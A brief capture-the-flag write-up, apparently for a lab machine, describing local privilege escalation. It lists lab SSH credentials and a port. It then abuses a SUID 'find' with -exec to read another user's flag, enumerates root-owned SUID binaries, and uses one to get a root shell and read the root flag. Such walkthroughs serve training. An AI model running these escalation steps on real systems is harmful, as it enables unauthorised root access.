## SUID Shenanigans

username: `holly`
password: `tuD@4vt0G*TU`

# nmap tip
ssh port: 65534

# find exploid
find has an option to `-exec` commands on each entry found. Since this program is owned by igor we can execute things as igor, proven by `find / -name flag1.txt -exec whoami \; 2>/dev/null`. Altering that to cat we can go `find / -name flag1.txt -exec cat /home/igor/flag1.txt \; 2>/dev/null`.

An difficult command gives all execututable files with a SUID bit by user. `find / -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null | grep "/bin"`. This gave a list. Trying all options `/usr/bin/system-control` gave a shell. In that shell typing `cat /root/flag2.txt` gave the final solution.